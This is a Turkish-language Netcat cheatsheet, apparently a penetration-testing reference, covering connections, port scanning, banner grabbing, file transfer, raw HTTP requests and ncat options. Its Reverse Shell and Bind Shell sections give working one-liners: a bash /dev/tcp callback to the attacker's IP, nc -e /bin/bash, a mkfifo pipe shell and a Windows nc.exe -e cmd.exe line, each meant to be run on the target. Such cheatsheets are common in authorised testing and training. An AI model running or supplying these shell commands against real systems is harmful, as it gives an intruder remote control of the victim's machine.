# Netcat Cheatsheet

## Temel Bağlantı

```bash
# Hedef porta bağlan
nc <hedef_ip> <port>
nc 192.168.1.10 80

# UDP bağlantısı
nc -u <hedef_ip> <port>

# Dinleyici (listener) başlat
nc -lvnp <port>
nc -l -v -n -p 4444

# Zaman aşımı
nc -w 5 <hedef_ip> <port>    # 5 saniye zaman aşımı
```

## Port Tarama

```bash
# Tek port kontrolü
nc -zv <hedef_ip> <port>

# Port aralığı tarama
nc -zv <hedef_ip> 1-1024
nc -zv <hedef_ip> 20 21 22 80 443

# UDP port tarama
nc -zvu <hedef_ip> 1-1024

# -z: Sıfır-I/O modu (sadece port açık mı kontrol et)
# -v: Ayrıntılı çıktı
```

## Banner Grabbing

```bash
echo "" | nc -nv -w1 <hedef_ip> <port>
echo "HEAD / HTTP/1.0\r\n\r\n" | nc <hedef_ip> 80
nc <hedef_ip> 22        # SSH banner
```

## Dosya Transferi

```bash
# Alıcı taraf (dinleyici)
nc -lvnp 4444 > alinan_dosya.txt

# Gönderici taraf
nc <hedef_ip> 4444 < gonderilecek_dosya.txt

# Dizin transferi (tar ile)
# Alıcı:
nc -lvnp 4444 | tar xvf -
# Gönderici:
tar cvf - /hedef/dizin | nc <alici_ip> 4444
```

## Reverse Shell

```bash
# Dinleyici (saldırgan tarafında)
nc -lvnp 4444

# Hedef sistemde çalıştır (bash)
bash -i >& /dev/tcp/<saldirgan_ip>/4444 0>&1

# Hedef sistemde çalıştır (nc ile)
nc <saldirgan_ip> 4444 -e /bin/bash           # -e destekliyorsa

# -e desteklemiyorsa (mkfifo yöntemi)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <saldirgan_ip> 4444 >/tmp/f

# Windows
nc.exe <saldirgan_ip> 4444 -e cmd.exe
```

## Bind Shell

```bash
# Hedef sistemde: shell açan dinleyici
nc -lvnp 4444 -e /bin/bash         # -e destekliyorsa

# mkfifo yöntemi (-e desteklemiyorsa)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash 2>&1 | nc -lvnp 4444 >/tmp/f

# Saldırgan: bağlan
nc <hedef_ip> 4444
```

## Shell Yükseltme (TTY)

```bash
# Basit Python PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'

# Tam etkileşimli TTY
# 1. Arka plana al: Ctrl+Z
# 2. Yerel terminal ayarları: stty raw -echo; fg
# 3. Shell'de:
export TERM=xterm
export SHELL=bash
stty rows 38 columns 116      # stty size ile yerel boyutunuzu öğrenin
```

## HTTP İstekleri

```bash
# GET isteği
echo -e "GET / HTTP/1.0\r\nHost: hedef.com\r\n\r\n" | nc hedef.com 80

# POST isteği
printf "POST /login HTTP/1.0\r\nHost: hedef.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 27\r\n\r\nusername=admin&******" | nc hedef.com 80
```

## Pratik Seçenekler

```
-l    Dinleyici modu
-v    Ayrıntılı mod
-n    DNS çözümlemeyi atla (yalnızca IP)
-p    Port belirt
-u    UDP modu
-z    Sıfır-I/O modu (port tarama)
-w    Zaman aşımı (saniye)
-e    Program çalıştır (bağlantı sonrası)
-k    Dinleyicide birden fazla bağlantıya izin ver
```

## ncat (Nmap'in Netcat'i)

```bash
# SSL ile bağlantı
ncat --ssl <hedef_ip> <port>

# SSL dinleyici
ncat --ssl -lvnp 4444

# Proxy üzerinden
ncat --proxy <proxy_ip>:<port> --proxy-type socks5 <hedef_ip> <port>

# Dosya transfer (SSL şifreli)
# Alıcı:
ncat --ssl -lvnp 4444 > dosya
# Gönderici:
ncat --ssl <hedef_ip> 4444 < dosya

# Erişim kontrolü
ncat -lvnp 4444 --allow 192.168.1.0/24
```
